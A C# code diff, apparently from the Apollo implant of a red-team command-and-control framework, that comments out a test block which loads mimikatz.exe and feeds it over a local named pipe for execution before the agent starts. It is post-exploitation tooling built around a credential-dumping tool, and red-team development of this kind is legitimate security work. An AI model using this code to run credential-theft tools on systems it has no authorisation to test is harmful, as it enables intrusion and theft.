@@ -39,52 +39,52 @@ namespace Apollo
 
         static void Main(string[] args)
         {
-            _sendAction = (object p) =>
-            {
-                PipeStream ps = (PipeStream)p;
-                while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
-                {
-                    WaitHandle.WaitAny(new WaitHandle[]
-                    {
-                    _senderEvent,
-                    _cancellationToken.Token.WaitHandle
-                    });
-                    if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
-                    {
-                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
-                    }
-                }
-                ps.Close();
-                _complete.Set();
-            };
+            //_sendAction = (object p) =>
+            //{
+            //    PipeStream ps = (PipeStream)p;
+            //    while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
+            //    {
+            //        WaitHandle.WaitAny(new WaitHandle[]
+            //        {
+            //        _senderEvent,
+            //        _cancellationToken.Token.WaitHandle
+            //        });
+            //        if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
+            //        {
+            //            ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
+            //        }
+            //    }
+            //    ps.Close();
+            //    _complete.Set();
+            //};
 
-            AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", "exetest");
-            client.ConnectionEstablished += Client_ConnectionEstablished;
-            client.MessageReceived += OnAsyncMessageReceived;
-            client.Disconnect += Client_Disconnect;
-            IPCCommandArguments cmdargs = new IPCCommandArguments
-            {
-                ByteData = System.IO.File.ReadAllBytes(@"C:\mimikatz\x64\mimikatz.exe"),
-                StringData = "mimikatz.exe coffee coffee coffee"
-            };
-            if (client.Connect(3000))
-            {
-                IPCChunkedData[] chunks = _jsonSerializer.SerializeIPCMessage(cmdargs);
-                foreach (IPCChunkedData chunk in chunks)
-                {
-                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(chunk)));
-                }
-                _senderEvent.Set();
-                WaitHandle.WaitAny(new WaitHandle[]
-                {
-                                                _complete,
-                                                _cancellationToken.Token.WaitHandle
-                });
-            }
-            else
-            {
-                Debugger.Break();
-            }
+            //AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", "exetest");
+            //client.ConnectionEstablished += Client_ConnectionEstablished;
+            //client.MessageReceived += OnAsyncMessageReceived;
+            //client.Disconnect += Client_Disconnect;
+            //IPCCommandArguments cmdargs = new IPCCommandArguments
+            //{
+            //    ByteData = System.IO.File.ReadAllBytes(@"C:\mimikatz\x64\mimikatz.exe"),
+            //    StringData = "mimikatz.exe coffee coffee coffee"
+            //};
+            //if (client.Connect(3000))
+            //{
+            //    IPCChunkedData[] chunks = _jsonSerializer.SerializeIPCMessage(cmdargs);
+            //    foreach (IPCChunkedData chunk in chunks)
+            //    {
+            //        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(chunk)));
+            //    }
+            //    _senderEvent.Set();
+            //    WaitHandle.WaitAny(new WaitHandle[]
+            //    {
+            //                                    _complete,
+            //                                    _cancellationToken.Token.WaitHandle
+            //    });
+            //}
+            //else
+            //{
+            //    Debugger.Break();
+            //}
 
             // This is main execution.
             Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
